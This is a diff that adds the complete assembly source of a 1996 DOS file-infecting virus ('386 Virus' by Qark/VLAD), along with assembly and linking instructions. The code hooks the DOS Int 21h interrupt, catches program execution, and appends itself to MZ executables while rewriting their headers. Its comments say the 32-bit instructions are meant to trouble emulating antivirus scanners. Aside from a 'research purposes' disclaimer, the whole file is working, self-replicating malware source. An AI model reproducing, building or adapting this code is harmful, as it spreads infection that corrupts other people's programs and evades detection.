@@ -1,0 +1,259 @@
+
+;
+;                         386 Virus
+;                       by Qark [VLAD]
+;
+; This virus is for purely research purposes, and would never take off in the
+; wild.  It's purpose is to demonstrate the use of 32bit 386 instructions
+; for DOS based viruses.  Half the time, using 32 bit instructions has no
+; advantages and just ends up wasting space, but otherwise it can save space
+; for example, using the multiple 'push' or 'pop' instructions.
+;
+; Using 32 bit code should also prove a problem for code emulating scanners.
+;
+;
+; Assembly Instructions:    (Shareware A86 doesn't do 386 opcodes)
+;  tasm 386
+;  tlink /3 386
+;  exe2bin 386
+;  ren 386.bin 386.com
+;
+
+
+.model tiny
+.data
+
+.code
+.386
+
+start:
+        org     0
+
+;        jmp     $
+
+        db      0beh            ;MOV SI,xxxx
+delta   dw      100h
+
+        cld
+
+        ;Check if a 386 is present.
+        pushf
+        pop     ax
+        or      ax,2000h
+        push    ax
+        popf
+        pushf
+        pop     ax
+        test    ax,2000h
+        jnz     is386
+
+exit_vir:
+
+        ;Restore the original SS:SP, and JMPF to the proper CS:IP
+
+        push    es
+        pop     ds
+
+        mov     ax,ds
+        add     ax,10h
+        add     word ptr cs:[si+offset cs_ip+2],ax
+
+        db      5                       ;ADD AX,xxxx
+ss_seg  dw      0fff0h
+        mov     ss,ax
+
+        db      0bch                    ;MOV SP,xxxx
+spp     dw      0fffeh
+
+        jmp     $+2
+
+        db      0eah
+cs_ip   dd      0fff00000h
+
+is386:
+        mov     eax,'VLAD'                      ;Nice long residency checks.
+        int     21h
+        cmp     eax,'ROCK'
+        je      exit_vir
+
+        ;Standard memory allocation stuffs.
+
+        mov     ax,ds
+        dec     ax
+        mov     ds,ax
+
+        xor     edi,edi
+        cmp     byte ptr [edi],'Y'
+        jb      exit_vir
+
+        sub     word ptr ds:[edi+03h],100h              ;(offset vir_mem/16)+1
+        sub     word ptr ds:[edi+012h],100h             ;(offset vir_mem/16)+1
+        mov     ax,word ptr [edi+12h]
+        push    es
+        mov     es,ax
+
+        push    cs
+        pop     ds
+
+        mov     ecx,offset vir_end
+        add     ecx,4
+        shr     ecx,2
+
+        push    si
+        rep     movsd
+        pop     si
+
+
+        ;Set Int21 handler
+        xor     ax,ax
+        mov     ds,ax
+        mov     eax,dword ptr ds:[021h*4]
+        mov     es:dword ptr i21,eax
+
+        mov     word ptr ds:[021h*04h],offset int21handler
+        mov     word ptr ds:[021h*04h+02h],es
+        pop     es
+
+        jmp     exit_vir
+
+        db      "386 Virus - by Qark/VLAD - 1996",0
+
+int21handler:
+        pushad
+        pushfd
+        push    ds
+        push    es
+        cmp     ax,4b00h                ;Grab file execution.
+        je      infectit
+        
+        cmp     eax,'VLAD'
+        jne     return21
+        pop     es
+        pop     ds
+        popfd
+        popad
+        mov     eax,'ROCK'
+        iret
+
+return21:
+        pop     es
+        pop     ds
+        popfd
+        popad
+        db      0eah
+i21     dd      0
+
+int21h  proc    near
+        pushf
+        call    dword ptr cs:i21
+        ret
+int21h  endp
+
+infectit:
+
+        mov     ax,3d02h                ;Open file.
+        call    int21h
+        jc      return21
+        xchg    bx,ax
+
+        push    cs
+        pop     ds
+
+        mov     ah,3fh                  ;Read in header.
+        mov     cx,512
+        mov     dx,offset read_buff
+        call    int21h
+
+        mov     esi,offset read_buff
+        
+        cmp     word ptr ds:[esi],'ZM'          ;Check for MZ header.
+        jne     close_exit
+        cmp     word ptr ds:[esi+12h],'VL'      ;Standard VLAD marker
+        je      close_exit
+        cmp     word ptr ds:[esi+0ch],0ffffh    ;Allocate all of memory ?
+        jne     close_exit
+        cmp     word ptr ds:[esi+18h],40h       ;Windows EXE ?
+        jae     close_exit
+
+        ;Save SS:SP
+        mov     ax,word ptr ds:[esi+0eh]
+        mov     ds:ss_seg,ax        ;
+
+        mov     ax,word ptr ds:[esi+10h]
+        mov     ds:spp,ax           ;
+
+        ;Save CS:IP
+        mov     eax,dword ptr ds:[esi+14h]      ;Save cs:ip
+        mov     ds:cs_ip,eax       ;
+
+        call    seek_end
+
+        mov     cx,16
+        div     cx
+
+        sub     ax,word ptr ds:[esi+8]
+
+        mov     word ptr ds:[esi+14h],dx
+        mov     word ptr ds:[esi+16h],ax
+        mov     word ptr ds:delta,dx         ;
+
+        add     dx,offset vir_mem
+        and     dx,0fffeh
+        inc     ax
+
+        mov     ds:[esi+0eh],ax
+        mov     ds:[esi+10h],dx
+
+        ;Write virus body.
+        mov     ah,40h
+        mov     cx,offset vir_end
+        xor     dx,dx
+        call    int21h
+
+        call    seek_end
+
+        mov     cx,512
+        div     cx
+
+        or      dx,dx
+        jz      no_page_fix
+        inc     ax
+no_page_fix:
+        mov     word ptr ds:[esi+4],ax
+        mov     word ptr ds:[esi+2],dx
+
+        mov     ax,4200h
+        xor     cx,cx
+        cwd
+        call    int21h
+
+        mov     word ptr ds:[esi+12h],'VL'
+
+        ;Write modified header.
+        mov     ah,40h
+        mov     cx,1dh
+        mov     dx,offset read_buff
+        call    int21h
+        
+close_exit:
+        ;Close file.
+        mov     ah,3eh
+        call    int21h
+
+        jmp     return21
+
+seek_end:
+        mov     ax,4202h
+        xor     cx,cx
+        cwd
+        call    int21h
+        ret
+
+vir_end:
+
+read_buff       db      512 dup (0)
+
+vir_mem:
+
+end     start
+
